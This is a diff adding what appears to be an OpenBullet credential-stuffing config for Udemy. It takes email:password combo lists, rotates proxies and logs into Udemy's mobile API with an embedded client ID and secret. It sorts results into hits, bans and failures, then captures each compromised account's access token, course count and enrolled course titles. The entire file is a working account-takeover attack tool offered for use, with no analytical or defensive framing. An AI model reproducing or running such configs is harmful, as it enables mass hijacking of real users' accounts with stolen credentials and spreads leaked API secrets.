@@ -1,0 +1,88 @@
+[SETTINGS]
+{
+  "Name": "Udemy",
+  "SuggestedBots": 100,
+  "LastModified": "2018-06-08T01:36:15.0329777+00:00",
+  "AdditionalInfo": "",
+  "Author": "Arthad \\\\\\/// Ruri",
+  "Version": "1.2.8 Anomaly",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [
+    {
+      "SliceName": "PASS",
+      "RuleType": 2,
+      "RuleString": "6",
+      "Id": 1275907141
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_LOGIN_PAGE REQUEST GET "https://www.udemy.com/join/login-popup/?ref=&display_type=popup&locale=en_US&response_type=json&next=https%3A%2F%2Fwww.udemy.com%2F&xref=" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: okhttp/3.8.0 UdemyAndroid 4.2.0(192) (phone)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-Mobile-Client-Id: REM6RUY6Q0E6Mzc6Mzg6NzA=" 
+  HEADER "X-Mobile-Visit-Enabled: true" 
+  HEADER "Accept-Language: en_US" 
+  HEADER "Cache-Control: private, max-age=0, no-cache" 
+  HEADER "Authorization: Basic YWQxMmVjYTljYmUxN2FmYWM2MjU5ZmU1ZDk4NDcxYTY6YTdjNjMwNjQ2MzA4ODI0YjIzMDFmZGI2MGVjZmQ4YTA5NDdlODJkNQ==" 
+  HEADER "X-Udemy-Client-Secret: a7c630646308824b2301fdb60ecfd8a0947e82d5" 
+  HEADER "X-Udemy-Client-Id: ad12eca9cbe17afac6259fe5d98471a6" 
+  HEADER "X-Version-Name: 4.2.0" 
+  HEADER "X-Client-Name: Udemy-Android" 
+#PARSE_CSRF PARSE "<SOURCE>" LR "csrfmiddlewaretoken' value='" "'" Recursive=FALSE -> VAR "CSRF" "" "" 
+#LOGIN REQUEST POST "https://www.udemy.com/api-2.0/auth/udemy-auth/login/?fields[user]=title,image_100x100,is_fraudster,num_subscribed_courses,name,access_token" AutoRedirect=TRUE 
+  CONTENT "email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: okhttp/3.8.0 UdemyAndroid 4.2.0(192) (phone)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-Client-Name: Udemy-Android" 
+  HEADER "X-Version-Name: 4.2.0" 
+  HEADER "X-Mobile-Client-Id: REM6RUY6Q0E6Mzc6Mzg6NzA=" 
+  HEADER "X-Mobile-Visit-Enabled: true" 
+  HEADER "Accept-Language: en_US" 
+  HEADER "Cache-Control: private, max-age=0, no-cache" 
+  HEADER "Authorization: Basic YWQxMmVjYTljYmUxN2FmYWM2MjU5ZmU1ZDk4NDcxYTY6YTdjNjMwNjQ2MzA4ODI0YjIzMDFmZGI2MGVjZmQ4YTA5NDdlODJkNQ==" 
+  HEADER "X-Udemy-Client-Secret: a7c630646308824b2301fdb60ecfd8a0947e82d5" 
+  HEADER "X-Udemy-Client-Id: ad12eca9cbe17afac6259fe5d98471a6" 
+  HEADER "X-Mobile-Visit-Enabled: true" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Ban OR 
+    KEY "You have exceeded the maximum number of requests per hour" 
+  KEYCHAIN Success OR 
+    KEY "num_subscribed_courses\":" 
+    KEY "count\"" 
+  KEYCHAIN Failure OR 
+    KEY "do not have permission to perform this action" 
+    KEY "Please check your email and password." 
+#PARSE_ACCESS_TOKEN PARSE "<SOURCE>" LR "access_token\": \"" "\"" Recursive=FALSE -> VAR "ACCTOKEN" "" "" 
+#SEE_ENROLLED REQUEST GET "https://www.udemy.com/api-2.0/users/me/subscribed-courses?fields%5Bcourse%5D=@min,visible_instructors,image_480x270,favorite_time,archive_time,completion_ratio,last_accessed_time,enrollment_time,features,num_collections&fields%5Buser%5D=@min,job_title&ordering=-access_time,-enrolled&page=1&page_size=100" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: okhttp/3.8.0 UdemyAndroid 4.2.0(192) (phone)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.udemy.com/" 
+  HEADER "X-Udemy-Authorization: Bearer <ACCTOKEN>" 
+  HEADER "Authorization: Bearer <ACCTOKEN>" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "{\"count\":" 
+#CAPTURE_COUNT PARSE "<SOURCE>" LR "count\": " "," Recursive=FALSE -> CAP "Count" "" "" 
+#CAPTURE_TITLES PARSE "<SOURCE>" LR "url\": \"/" "/learn" Recursive=TRUE -> CAP "Title" "" "" 
